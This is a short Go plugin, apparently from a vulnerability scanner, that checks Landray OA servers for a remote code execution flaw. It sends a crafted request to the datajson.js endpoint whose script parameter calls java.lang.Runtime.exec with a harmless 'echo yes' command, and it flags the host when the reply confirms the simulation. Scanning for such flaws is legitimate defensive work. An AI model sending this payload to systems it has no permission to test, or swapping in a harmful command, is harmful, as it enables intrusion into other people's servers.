package landray

import (
	"fmt"
	"nscan/plugins/log"
	"nscan/utils"
	"strings"
)

func Landray_RCE(u string) bool {
	payload := "s_bean=sysFormulaSimulateByJS&script=function%20test(){return%20java.lang.Runtime};r=test();r.getRuntime().exec(\"echo%20yes\")&type=1"

	if resp, err := utils.HttpRequset(u+"/data/sys-common/datajson.js?"+payload, "GET", "", false, nil); err == nil {
		if strings.Contains(resp.Body, "模拟通过") {
			log.Logger.Warn().Msg(fmt.Sprintf("Found vuln Landray OA RCE|%s\n", u))
			return true
		}
	}

	return false
}
